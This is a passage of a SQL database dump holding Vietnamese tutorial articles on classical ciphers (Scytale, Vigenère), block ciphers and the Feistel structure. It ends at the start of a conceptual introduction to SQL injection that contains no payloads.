style=\"margin-left: 20px\">​</div><b>3.     Mật mã cổ điển</b><br>\r\n    <div style=\"margin-left: 20px\">Ta có nhiều cách để phân loại mật mã.​</div><div style=\"margin-left: 20px\">​</div><div style=\"margin-left: 40px\">-         <b>Dựa theo tính chất của khóa</b> ta có thể phân chia thành Mật mã khóa đối xứng(còn được gọi là mật mã khóa bí mật) và Mật mã khóa bất đối xứng (mật mã khóa công khai).​</div><div style=\"margin-left: 40px\">​</div><div style=\"margin-left: 40px\">-         <b>Dựa theo cách thức tiến hành mã hóa</b> ta có thể phân chia thành Mật mã dòng (Stream Cipher) và Mật mã khối (Block Cipher).​</div><div style=\"margin-left: 40px\">​</div><div style=\"margin-left: 40px\">-         <b>Dựa theo thời gian xuất hiện</b> hệ mã hóa ta có thể phân chia thành mật mã hiện đại và mật mã cổ điển. Mật mã cổ điển là các loại mật mã xuất hiện trước năm 1970 còn mật mã hiện đại là các mật mã xuất hiện trong khoảng thời gian từ 1970 đến nay.​</div><div style=\"margin-left: 20px\">​</div><div style=\"margin-left: 20px\">Bản thân mật mã cổ điển có thể được chia thành 2 nhánh : Chuyển vị và Thay thế.​</div><div style=\"margin-left: 20px\">2 nhánh này có bản chất của quá trình mã hóa khác nhau:​</div><div style=\"margin-left: 20px\">​</div><div style=\"margin-left: 40px\">-         <b>Chuyển vị</b> : là sự thay đổi vị trí các thành phần (thường là ký tự) của bản rõ. Bản rõ và bản mã có các ký tự giống nhau, chỉ khác nhau về vị trí của các ký tự đó.​</div><div style=\"margin-left: 40px\">​</div><div style=\"margin-left: 40px\">-         <b>Thay thế</b> : là việc thay một ký tự của bản rõ bằng một ký tự khác trong bản mã. Bản rõ và bản mã có các ký tự là khác nhau cả về số lượng và vị trí.​</div><div style=\"margin-left: 40px\">​</div><div style=\"margin-left: 40px\">Hẹn gặp lại mọi người trong phần tiếp theo trình bày về Mật mã chuyển vị.​</div><div style=\"margin-left: 40px\">​</div><div style=\"margin-left: 40px\">​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(63, 'Giới thiệu về mật mã cổ điển - Phần 2', '', '<div class=\"bbWrapper\">Mật mã chuyển vị là sự sắp xếp lại các ký tự trong bản rõ đến tạo ra bản mã là một hoán vị của bản rõ.<br>\r\n    Với một bản rõ có độ dài nhỏ, việc sử dụng chuyển vị để mã hóa sẽ kém an toàn. Ví dụ một thông điệp gồm 3 ký tự :”now” sẽ chỉ tạo ra tối đa 6 hoán vị, sẽ dễ dàng cho kẻ tấn công tìm ra bản rõ dù không biết quá trình mã hóa.<br>\r\n    <br>\r\n    Tuy nhiên khi độ dài của bản rõ tăng lên thì số cách sắp xếp khả dĩ cũng tăng lên, khiến không thể tìm lại được bản rõ từ bản mã nếu không biết chính xác cách mã hóa.<br>\r\n    Một mật mã chuyển vị sơ khai nhất chính là khúc gỗ bí mất (Scytale) của người Sparta có từ thế kỷ thứ 5 trước công nguyên.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/Mat-ma-chuyen-vi.png\">\r\n    </div><br>\r\n    Scytale là một khúc gỗ có hình dạng và kích thước xác định có quấn quanh bằng một dải da. Người gửi sẽ viết thư theo chiều dài của khúc gỗ rồi sau đó bóc dải da ra, lúc nãy trên dây chỉ là một dãy chữ cái vô nghĩa.<br>\r\n    Ví dự như bản rõ là  : “Help me I am under attack” và được viết lên dải da như sau.<br><br><br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">Mã:</div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>       \r\n            |   |   |   |   |   |  | <br>\r\n           | H | E | L | P | M |  | <br>\r\n         __| E | I | A | M | U |__| <br>\r\n        |  | N | D | E | R | A | <br>\r\n        |  | T | T | A | C | K | <br>\r\n        |  |   |   |   |   |   |</code></pre>\r\n        </div>\r\n    </div><br><br>\r\n    Ta có bản mã sẽ là <b>HENTEIDTLAEAPMRCMUAK</b>.<br>\r\n    Để giải mã thông điệp trên thì người nhận chỉ cần quấn dải da quanh Scytale và đọc được bản rõ.<br><br>\r\n    Thực chất Scytale là việc ta viết bản rõ theo hàng ngang với số cột trên mỗi hàng cố định rồi đọc theo hàng dọc để có được bản mã.<br><br>\r\n    Từ đó ta cũng có một số loại mã hóa chuyển vị khác tương tự bằng cách đọc các cột theo thứ tự khác nhau hay đọc theo đường xoắn ốc.<br><br>\r\n    Sau đây là một bản mã chờ mọi người giải mã.<br><br>\r\n    <b>“AIOTCTOUOUNGRTYIGANTNLNO”</b></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(64, 'Giới thiệu về mật mã cổ điển - Phần 3', '', '<div class=\"bbWrapper\"><b>2. Mật mã đa bản thế (polyalphabetic cipher)</b><br>\r\n    <br>\r\n    Ở mật mã một bảng thế, ta có ánh xạ 1-1 giữa các ký tự trong bản rõ và bản mã. Khóa của mật mã 1 bảng thế chính là thứ tự sắp xếp giữa các ký tự trong bản rõ và bản mã tương ứng.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/mat-ma-co-dien_2.png\">\r\n    </div><br>\r\n    Trong mật mã đa bảng thế, ta sử dụng nhiều bảng thế khác nhau theo một thứ tự xác định. Ánh xạ giữa bản rõ và bản mã là Một – Nhiều. Khóa của mật mã nhiều bản thế ngoài các bản thế được sử dụng còn cần thêm thông tin về thứ tự sử dụng các bản thế đó.<br>\r\n    <br>\r\n    Xét một hệ mã đơn giản với bảng chữ gồm 4 chữ cái {a,b,c,d} Giả sử tần xuất xuất hiện của mỗi chữ trong ngôn ngữ như sau: Pa = 0.5, Pb =0.05, Pc = 0.2, Pd = 0.25 Ta dùng hai bảng thế và một chuỗi khóa để quyết định thứ tự hòa trộn hai bảng thế này.<br>\r\n    Bảng thế 1:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">Mã:</div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>[INDENT=3]a b c d<br>\r\n    B D A C <br>\r\n    [/INDENT]</code></pre>\r\n        </div>\r\n    </div>Bảng thế 2:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>[INDENT=3]a b c d<br>\r\n    D B C D <br>\r\n    [/INDENT]</code></pre>\r\n        </div>\r\n    </div>Tạo mã bằng phương pháp trộn 2 bảng thế theo khóa “12”<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>[INDENT]X : aba cada da ca baa <br>\r\n    Z : 121 2121 21 21 212 <br>\r\n    Y : BBB CBAB AB CB BBD <br>\r\n    [/INDENT]</code></pre>\r\n        </div>\r\n    </div>Ở ví dụ trên người ta đã hoà trộn hai bảng thế liên tục kế tiếp nhau. Nhờ đó phân bố tần xuất xuất hiện của các chữ mã sẽ bị thay đổi so với tin và bằng phẳng hơn.<br>\r\n    <br>\r\n    <b>a) Mật mã Vigenère</b><br>\r\n    <br>\r\n    Mật mã Vigenère là một phương pháp mã hóa văn bản bằng cách sử dụng xen kẽ một số phép mã hóa Caesar khác nhau dựa trên các chữ cái của một từ khóa. Nó là một dạng đơn giản của mật mã thay thế dùng nhiều bảng chữ cái.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/vi.png\">\r\n    <br><br>\r\n    Hình 1: Hình vuông Vigenère​</div><br>\r\n    Trong phép mã hóa Caesar, mỗi ký tự của bảng chữ cái được dịch đi một khoảng nhất định, ví dụ với bước dịch là 4, A trở thành E, B trở thành F... Mật mã Vigenère là sự kết hợp xen kẽ vài phép mã hóa Caesar với các bước dịch khác nhau.<br>\r\n    Để mã hóa, ta dùng một hình vuông Vigenère. Nó gồm 26 hàng, mỗi hàng dịch về bên trái một bước so với hàng phía trên, tạo thành 26 bảng mã Caesar. Trong quá trình mã hóa, tùy theo từ khóa mà mỗi thời điểm ta dùng một dòng khác nhau để mã hóa văn bản.<br>\r\n    <br>\r\n    Ví dụ về mật mã Vigenère :<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>[TABLE]<br>\r\n    [TR] <br>\r\n    [TD][B]Khóa[/B][/TD] <br>\r\n    [TD][B]vigenerevigenerevig[/B][/TD] <br>\r\n    [/TR] <br>\r\n    [TR] <br>\r\n    [TD][B]Bản rõ[/B][/TD] <br>\r\n    [TD][B]polyalphabeticciphe[/B][/TD] <br>\r\n    [/TR] <br>\r\n    [TR] <br>\r\n    [TD][B]Bản mã[/B][/TD] <br>\r\n    [TD][B]KWRCNPGLVJKXVGTMKPK[/B][/TD] <br>\r\n    [/TR] <br>\r\n    [/TABLE]</code></pre>\r\n        </div>\r\n    </div></div>', '', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(65, 'Giới thiệu về mật mã cổ điển - Phần 3 - Mã thay thế', '', '<div class=\"bbWrapper\"><b>2. Mật mã đa bản thế (polyalphabetic cipher)</b><br>\r\n    <br>\r\n    Ở mật mã một bảng thế, ta có ánh xạ 1-1 giữa các ký tự trong bản rõ và bản mã. Khóa của mật mã 1 bảng thế chính là thứ tự sắp xếp giữa các ký tự trong bản rõ và bản mã tương ứng.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/mat-ma-co-dien_2.png\">\r\n    </div><br>\r\n    Trong mật mã đa bảng thế, ta sử dụng nhiều bảng thế khác nhau theo một thứ tự xác định. Ánh xạ giữa bản rõ và bản mã là Một – Nhiều. Khóa của mật mã nhiều bản thế ngoài các bản thế được sử dụng còn cần thêm thông tin về thứ tự sử dụng các bản thế đó.<br>\r\n    <br>\r\n    Xét một hệ mã đơn giản với bảng chữ gồm 4 chữ cái {a,b,c,d} Giả sử tần xuất xuất hiện của mỗi chữ trong ngôn ngữ như sau: Pa = 0.5, Pb =0.05, Pc = 0.2, Pd = 0.25 Ta dùng hai bảng thế và một chuỗi khóa để quyết định thứ tự hòa trộn hai bảng thế này.<br>\r\n    Bảng thế 1:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>[INDENT=3]a b c d<br>\r\n    B D A C<br>\r\n    [/INDENT]</code></pre>\r\n        </div>\r\n    </div>Bảng thế 2:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>[INDENT=3]a b c d<br>\r\n    D B C D<br>\r\n    [/INDENT]</code></pre>\r\n        </div>\r\n    </div>Tạo mã bằng phương pháp trộn 2 bảng thế theo khóa “12”<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>[INDENT]X : aba cada da ca baa<br>\r\n    Z : 121 2121 21 21 212<br>\r\n    Y : BBB CBAB AB CB BBD<br>\r\n    [/INDENT]</code></pre>\r\n        </div>\r\n    </div>Ở ví dụ trên người ta đã hoà trộn hai bảng thế liên tục kế tiếp nhau. Nhờ đó phân bố tần xuất xuất hiện của các chữ mã sẽ bị thay đổi so với tin và bằng phẳng hơn.<br>\r\n    <br>\r\n    <b>a) Mật mã Vigenère</b><br>\r\n    <br>\r\n    Mật mã Vigenère là một phương pháp mã hóa văn bản bằng cách sử dụng xen kẽ một số phép mã hóa Caesar khác nhau dựa trên các chữ cái của một từ khóa. Nó là một dạng đơn giản của mật mã thay thế dùng nhiều bảng chữ cái.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"vi.png\"><br><br>\r\n    Hình 1: Hình vuông Vigenère​</div><br>\r\n    Trong phép mã hóa Caesar, mỗi ký tự của bảng chữ cái được dịch đi một khoảng nhất định, ví dụ với bước dịch là 4, A trở thành E, B trở thành F... Mật mã Vigenère là sự kết hợp xen kẽ vài phép mã hóa Caesar với các bước dịch khác nhau.<br>\r\n    Để mã hóa, ta dùng một hình vuông Vigenère. Nó gồm 26 hàng, mỗi hàng dịch về bên trái một bước so với hàng phía trên, tạo thành 26 bảng mã Caesar. Trong quá trình mã hóa, tùy theo từ khóa mà mỗi thời điểm ta dùng một dòng khác nhau để mã hóa văn bản.<br>\r\n    <br>\r\n    Ví dụ về mật mã Vigenère :<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>[TABLE]<br>\r\n    [TR]<br>\r\n    [TD][B]Khóa[/B][/TD]<br>\r\n    [TD][B]vigenerevigenerevig[/B][/TD]<br>\r\n    [/TR]<br>\r\n    [TR]<br>\r\n    [TD][B]Bản rõ[/B][/TD]<br>\r\n    [TD][B]polyalphabeticciphe[/B][/TD]<br>\r\n    [/TR]<br>\r\n    [TR]<br>\r\n    [TD][B]Bản mã[/B][/TD]<br>\r\n    [TD][B]KWRCNPGLVJKXVGTMKPK[/B][/TD]<br>\r\n    [/TR]<br>\r\n    [/TABLE]</code></pre>\r\n        </div>\r\n    </div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(66, 'Kiến trúc mã hoá khối (Block Cipher) – Phần 1', '', '<div class=\"bbWrapper\"><b><span style=\"font-size: 18px\">Mã hoá khối truyền thống</span></b><br><br>\r\n    Một số thuật toán mã hóa khối đối xứng quan trọng được sử dụng hiện tại được dựa trên cấu trúc được gọi là mật mã khối Feistel [FEIS73]. Vì lý do đó, điều quan trọng là kiểm tra các nguyên tắc thiết kế của mật mã Feistel. Chúng ta bắt đầu với một so sánh về Stream Cipher và Block Cipher. Sau đó, chúng ta thảo luận về cấu trúc mật mã khối Feistel.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/Block-cipher_1.png\">\r\n    </div><br>\r\n    <b><span style=\"font-size: 18px\">Stream Ciphers và Block Ciphers</span></b><br><br>\r\n    Stream Cipher là loại mã hóa luồng dữ liệu số một bit hoặc một byte mỗi lần. Ví dụ về stream cipher cổ điển là mật mã Vigenère tự động và mật mã Vernam. Trong trường hợp lý tưởng, phiên bản one-time pad. của mật mã Vernam sẽ được sử dụng, trong đó keystream (ki) dài bằng số bit plaintext (pi). Nếu keystream mật mã là ngẫu nhiên, thì mật mã này không thể bị phá vỡ bằng bất kỳ phương tiện nào khác ngoài việc có được keystream. Tuy nhiên, keystream  phải được cung cấp cho cả hai phía người dùng trước thông qua một số kênh độc lập và an toàn. Điều này dẫn đến một số vấn đề không thể sử dụng đối với dữ liệu lớn<br>\r\n    <br>\r\n    Theo đó, vì lý do thực tế, trình tạo bit-stream phải được xem là một thủ tục thuật toán, vì vậy bit-stream mã hoá có thể được sản xuất bởi cả hai phía người dùng. Bộ tạo bit-stream là một thuật toán được điều khiển bằng khóa và phải tạo ra một bit-stream mạnh về mặt mã hoá. Nghĩa là, phải tính toán không thực tế để dự đoán các phần trong tương lai của bit-stream dựa trên các phần trước của bit-stream. Hai người dùng chỉ cần chia sẻ khóa tạo và mỗi người có thể tạo ra keystream.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/q1.png\">\r\n    </div><br>\r\n    Block Cipher là một khối trong đó một khối plaintext được coi là khối văn bản gốc cần được xử lý và được sử dụng để tạo ra một khối cipher text có độ dài bằng nhau. Thông thường, kích thước khối 64 hoặc 128 bit được sử dụng, giống như với Stream Cipher, hai người dùng chia sẻ khóa mã hóa đối xứng.<br>\r\n    <br>\r\n    Sử dụng một số chế độ hoạt động, một Block Cipher có thể được sử dụng để đạt được hiệu quả tương tự như Stream Cipher. Cần nhiều nỗ lực hơn nữa để đi vào phân tích mật mã khối, nhìn chung, Block cipher dường như có thể áp dụng cho một phạm vi ứng dụng rộng hơn so với Stream Cipher. Phần lớn các ứng dụng mã hóa đối xứng dựa trên mạng sử dụng Block Cipher.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/q2.png\">\r\n    <br>​</div><b><span style=\"font-size: 18px\">Cấu trúc mật mã Feistel</span></b><br><br>\r\n    Một mật mã khối hoạt động trên một khối plaintext gồm n bit để tạo ra một khối ciphertext gồm n bit. Có 2^n khối plaintext khác nhau có thể và để mã hóa có thể đảo ngược (nghĩa là để giải mã được), mỗi khối phải tạo ra một khối ciphertext duy nhất. Một chuyển đổi như vậy được gọi là đảo ngược, hoặc không có nghĩa. Các ví dụ sau đây minh họa các phép biến đổi không đặc trưng và số ít cho n = 2.<br>\r\n    <div style=\"text-align: center\"><br>\r\n        <img src=\"Imageass/q3.png\"><br>\r\n    ​</div>Trong trường hợp sau, một ciphertext của 01 có thể được tạo bởi một trong hai khối văn bản thuần túy. Vì vậy, nếu chúng ta giới hạn reversible mapping, số lượng biến đổi khác nhau là (2n!)^2.<br>\r\n    <div style=\"text-align: center\"><br>\r\n        <img src=\"Imageass/q4.png\">\r\n    <br>​</div>Hình trên minh họa logic của một mật mã thay thế chung cho n = 4. Một đầu vào 4 bit tạo ra một trong 16 trạng thái đầu vào có thể, được ánh xạ bởi mật mã phụ vào một trong 16 trạng thái đầu ra có thể, mỗi trạng thái được lặp lại - được gửi bởi 4 bit plaintext.<br>\r\n    <br>\r\n    Ánh xạ mã hóa và giải mã có thể được xác định bằng cách lập bảng, như bảng dưới đây:<br><br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/q5.png\">\r\n    <br>​</div>Feistel gọi đây là “idea block cipher”. Bởi vì nó cho phép số lượng ánh xạ mã hóa tối đa có thể có từ khối plaintext. Nhưng có một vấn đề thực tế với “idea block cipher”. Nếu kích thước khối nhỏ, chẳng hạn như n = 4, được sử dụng, thì hệ thống tương đương với mật mã thay thế cổ điển. Các hệ thống như vậy, như chúng ta đã thấy, dễ bị tấn công khi phân tích thống kê về plaintext. Điểm yếu này không phải là cố hữu trong việc sử dụng mật mã thay thế mà là kết quả của việc sử dụng kích thước khối nhỏ. Nếu n đủ lớn và sự thay thế có thể đảo ngược tùy ý giữa plaintext và cipher được cho phép, thì các đặc điểm thống kê của plaintext gốc được che giấu đến mức mà loại phân tích mật mã này không khả thi. Tuy nhiên, một mật mã thay thế có thể đảo ngược tùy ý (mật mã khối lý tưởng) cho kích thước khối lớn là không thực tế, tuy nhiên, từ quan điểm thực hiện và hiệu suất. Đối với một chuyển đổi như vậy, chính ánh xạ tạo thành khóa. Xem xét lại bảng chuyển đổi phía trên, định nghĩa một ánh xạ đảo ngược cụ thể từ plaintext sang ciphertext cho n = 4. Ánh xạ có thể được xác định bởi các mục trong cột thứ hai, hiển thị giá trị của ciphertext cho mỗi khối plaintext. Về bản chất, đây là chìa khóa xác định ánh xạ cụ thể trong số tất cả các ánh xạ có thể. Trong trường hợp này, sử dụng phương pháp xác định khóa đơn giản này, độ dài khóa cần thiết là (4 bit) * (16 rows) = 64 bit. Nói chung, đối với một mật mã khối lý tưởng n bit, độ dài của khóa được xác định theo kiểu này là n * (2^n) bit. Đối với khối 64 bit, có độ dài mong muốn để ngăn chặn các cuộc tấn công thống kê, độ dài khóa cần thiết là 64 * (2^64) = 2^70 tương đương 10^21 bit.</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(67, 'Kiến trúc mã hoá khối (Block Cipher) – Phần 2', '', '<div class=\"bbWrapper\">Phần trước chúng ta đã so sánh về Stream Cipher và Block Cipher, qua đó cũng có một cái nhìn tổng quát về Block Cipher là như thế nào. Chúng ta cũng biết được Feistel encryption, kiến trúc và cách tính toán cơ bản. Tiếp theo chúng ta sẽ nói về Feistel Cipher và thuật toán cấu thành nên nó.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/Feistel Cipher_1.png\">\r\n    </div><br>\r\n    <b><span style=\"font-size: 18px\">Feistel Cipher</span></b><br>\r\n    <br>\r\n    Feistel đã đề xuất rằng chúng ta có thể tính gần đúng “idea block cipher” bằng cách sử dụng khái niệm về “product cipher”, đó là việc thực hiện hai hoặc nhiều loại mã hoá đơn giản theo cách sao cho kết quả cuối cùng hoặc sản phẩm được mã hóa mạnh hơn bất kỳ mã hoá  thành phần nào. Bản chất của phương pháp này là phát triển một mật mã khối với độ dài khóa là k bit và chiều dài khối là n bit, cho phép tổng cộng 2^k biến đổi có thể, thay vì (2^n)! biến đổi có sẵn với “idea block cipher”.<br>\r\n    <br>\r\n    Cụ thể, Feistel đề xuất sử dụng một mã hoá thay thế các thay thế và hoán vị, trong đó các thuật ngữ này được định nghĩa như sau:<br>\r\n    <br>\r\n    -      Substitution (Thay thế): Mỗi thành phần hoặc nhóm yếu tố văn bản gốc được thay thế duy nhất bằng một yếu tố mã hóa tương ứng hoặc nhóm các yếu tố mã hoá liên quan.<br>\r\n    <br>\r\n    -      Permutation (Hoán vị): Một chuỗi các thành phần của văn bản được thay thế bằng hoán vị của chuỗi đó. Đó là, không có phần tử nào được thêm hoặc xóa hoặc thay thế trong chuỗi, thay vào đó là thứ tự các phần tử xuất hiện trong chuỗi được thay đổi.<br>\r\n    <br>\r\n    <b><span style=\"font-size: 18px\">Kiến trúc bên trong của Feistel Cipher</span></b><br>\r\n    <div style=\"text-align: center\"><br>\r\n        <img src=\"Imageass/e1.png\">\r\n    </div><br>\r\n    Phía bên trái của hình trên mô tả cấu trúc mã hóa được đề xuất bởi Feistel. Các đầu vào của thuật toán mã hóa là một khối văn bản có độ dài 2w bit và khóa K. Khối plaintext được chia thành hai nửa, LE0 và RE0. Hai nửa dữ liệu đi qua n vòng xử lý và sau đó kết hợp để tạo ra khối ciphertext.<br>\r\n    <br>\r\n    Mỗi vòng i có đầu vào LEi - 1 và REi - 1 xuất phát từ vòng trước, cũng như một khóa con Ki có nguồn gốc từ tất cả K. Nói chung, các khóa con Ki khác với K và khác nhau. Trong hình trên, 16 round được sử dụng, mặc dù số lượng round có thể được thực hiện nhiều hơn.<br>\r\n    <br>\r\n    Tất cả các round có cấu trúc giống nhau. Một substitution(Thay thế) được thực hiện ở nửa bên trái của dữ liệu. Điều này được thực hiện bằng cách áp dụng 1 round function F cho nửa bên phải của dữ liệu và sau đó lấy exclusive-OR của đầu ra của chức năng đó và nửa bên trái của dữ liệu.<br>\r\n    <br>\r\n    Round function có cấu trúc chung giống nhau cho mỗi round nhưng được tham số hóa bởi khóa con Ki. Một cách khác để diễn đạt điều này là nói rằng F là một hàm của nửa bit bên phải và một khóa con của các bit y, tạo ra giá trị đầu ra có độ dài w bit: F (REi, Ki + 1).<br>\r\n    <br>\r\n    Sau substitution này, một permutation (hoán vị) được thực hiện bao gồm sự trao đổi của hai nửa dữ liệu. Cấu trúc này là một dạng đặc biệt của mạng hoán vị thay thế (SPN) do Shannon đề xuất.<br>\r\n    <br>\r\n    Việc thực hiện chính xác mạng Feistel phụ thuộc vào việc lựa chọn các tham số và tính năng thiết kế sau:<br>\r\n    <br>\r\n    -       Block size: Block size lớn hơn có nghĩa là bảo mật cao hơn (tất cả những thứ khác đều bằng nhau) nhưng giảm tốc độ encrypt/decrypt cho một thuật toán nhất định. Bảo mật  hơn đạt được bằng sự khuếch tán lớn hơn. Theo truyền thống, kích thước khối 64 bit đã được coi là sự đánh đổi hợp lý và gần như phổ biến trong thiết kế block cipher. Tuy nhiên, AES mới sử dụng kích thước khối 128 bit.<br>\r\n    <br>\r\n    -       Key size: Key size lớn hơn có nghĩa là bảo mật cao hơn nhưng có thể làm giảm tốc độ encrypt/decrypt. Bảo mật cao hơn đạt được nhờ khả năng chống lại các cuộc tấn công brute-force. Kích thước khóa từ 64 bit trở xuống hiện được coi là không đủ và 128 bit đã trở thành kích thước phổ biến.<br>\r\n    <br>\r\n    -       Số round: Bản chất của mật mã Feistel là một round duy nhất cung cấp bảo mật không đầy đủ nhưng nhiều round cung cấp bảo mật càng tăng lên. Số round điển hình là 16 vòng.<br>\r\n    <br>\r\n    -       Thuật toán tạo khóa con: Độ phức tạp lớn hơn trong thuật toán này sẽ dẫn đến khó khăn hơn về “cryptanalysis”.<br>\r\n    <br>\r\n    Có hai cân nhắc khác trong thiết kế mật mã Feistel:<br>\r\n    <br>\r\n    -       Fast software encryption/decryption: Trong nhiều trường hợp, mã hóa được nhúng trong các ứng dụng hoặc chức năng tiện ích theo cách ngăn chặn việc triển khai phần cứng. Theo đó, tốc độ thực hiện của thuật toán trở thành một mối quan tâm lớn.<br>\r\n    <br>\r\n    -       Dễ phân tích: Mặc dù chúng ta muốn làm cho thuật toán của chúng ta trở nên khó khăn nhất có thể để mã hóa, nhưng có lợi ích lớn trong việc làm cho thuật toán dễ dàng phân tích. Nếu thuật toán có thể được giải thích chính xác và rõ ràng, việc phân tích thuật toán đó cho các lỗ hổng “cryptanalysis” sẽ dễ dàng hơn và do đó phát triển mức độ đảm bảo cao hơn về độ mạnh của nó. Ví dụ, DES không có chức năng dễ dàng để bị phân tích.<br>\r\n    <br>\r\n    Trên đây là cơ sở về Block Cipher, nguồn gốc cũng như mô tả cơ bản block cipher là gì, cách thức hoạt động cũng như hướng thiết kế một block cipher cho ứng dụng.</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(68, 'Web1: SQL injection - Con đường khai thác phổ biến: qua “user input”.', '', '<div class=\"bbWrapper\"><div style=\"text-align: center\"><b><span style=\"font-size: 15px\"><span style=\"color: red\">Web1: SQL injection - Con đường khai thác phổ biến: qua “user input”.</span></span></b>​</div><br>\r\n<b>Giới thiệu</b><br>\r\n<br>\r\nWikipedia: “<i>Sql Injection (SQLi) là một kỹ thuật cho phép những kẻ tấn công lợi dụng lỗ hổng của việc kiểm tra dữ liệu đầu vào trong các ứng dụng web và các thông báo lỗi của hệ quản trị cơ sở dữ liệu trả về để inject (tiêm vào) và thi hành các câu lệnh SQL bất hợp pháp, Sql Injection có thể cho phép những kẻ tấn công thực hiện các thao tác, thêm, sửa, xóa… trên cơ sở dữ liệu của ứng dụng. Lỗi này thường xảy ra trên các ứng dụng web có dữ liệu được quản lý bằng các hệ quản trị cơ sở dữ liệu như SQL Server, MySQL, Oracle, DB2, Sysbase...</i>”<br>\r\n<br>\r\nSql Injection được mô tả như là một trong những lỗ hổng bảo mật web nguy hiểm nhất. Khai thác Sql Injection, ngoài việc đoạt được quyền kiểm soát về mặt dữ liệu như đã nói ở trên, hacker còn có thể cài đặt backdoor trên server mà ứng dụng đang chạy, qua đó kiểm soát toàn bộ hệ thống…<br>\r\n<br>\r\nChúng ta sẽ cùng tìm hiểu về chủ đề này theo các chuyên đề nhỏ dưới đây:<br>\r\n<br>\r\n<div style=\"margin-left: 20px\"><b><a href=\"https://whitehat.vn/threads/674\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwhitehat.vn%2Fthreads%2F674&amp;hash=274d8193371a80ef9b7e94c0cf2e027e\">Web1: SQL injection - Con đường khai thác phổ biến: qua “user input”.</a><br>\r\n<a href=\"https://whitehat.vn/threads/712\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwhitehat.vn%2Fthreads%2F712&amp;hash=9c630c625ea2946ef434ce9a8675f942\">Web2: SQL injection - Các con đường khai thác khác</a><br>\r\n<a href=\"https://whitehat.vn/threads/762\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwhitehat.vn%2Fthreads%2F762&amp;hash=68917067fb09461328745bafb0bae2c6\">Web3: SQL injection - Các hướng khai thác</a><br>\r\n<a href=\"https://whitehat.vn/threads/810\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwhitehat.vn%2Fthreads%2F810&amp;hash=de0e9a66993d90b6586b821e33506f96\">Web4: SQL injection - Các bước khai thác</a><br>\r\n<a href=\"https://whitehat.vn/threads/885\" class=\"link link--internal\" 